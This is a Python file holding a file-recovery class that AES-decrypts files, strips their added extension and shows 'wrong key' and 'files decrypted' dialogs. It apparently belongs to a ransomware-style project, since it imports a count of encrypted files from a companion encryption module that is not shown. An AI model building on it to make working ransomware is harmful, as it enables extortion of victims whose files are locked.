from ast import Break
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad,unpad
from base64 import b64decode
import getpass
import os,string
from tkinter import messagebox
from encryption import files_encrypted
import sys

files_decrypted=0
ct_err=0

class Recover:
    def __init__(self,file_name,key):
        self.file_name=file_name
        self.key=key
    
    def decrypted_file(self):
        global files_decrypted,ct_err
        with open (self.file_name,"r") as file:
            try:
                data = file.read()
                length= len(data)
                iv= data[:24]
                iv = b64decode(iv)
                ciphertext= data[24:length]
                ciphertext= b64decode(ciphertext)
                cipher= AES.new(self.key,AES.MODE_CFB,iv)
                decrypted = cipher.decrypt(ciphertext)
                decrypted = unpad(decrypted,AES.block_size)
                with open (self.file_name,"wb") as data:
                    data.write(decrypted)
                    data.close
                file.close()
                os.rename(self.file_name,self.file_name[:-5])
                files_decrypted += 1
                
            except(ValueError,KeyError):
                if ct_err==0:
                 print("wrong password")
                 messagebox.showerror("ERROR","Wrong Key!!! Enter the valid key ") 
                ct_err += 1   
                
            
                
    
    def winclose(self):
        global files_encrypted
        if files_encrypted==files_decrypted:
         messagebox.showinfo("Success","YOUR FILES HAVE BEEN DECRYPTED")
         sys.exit("Your files have been decrypted successfully")
        
        

    
                
                  
            
            
            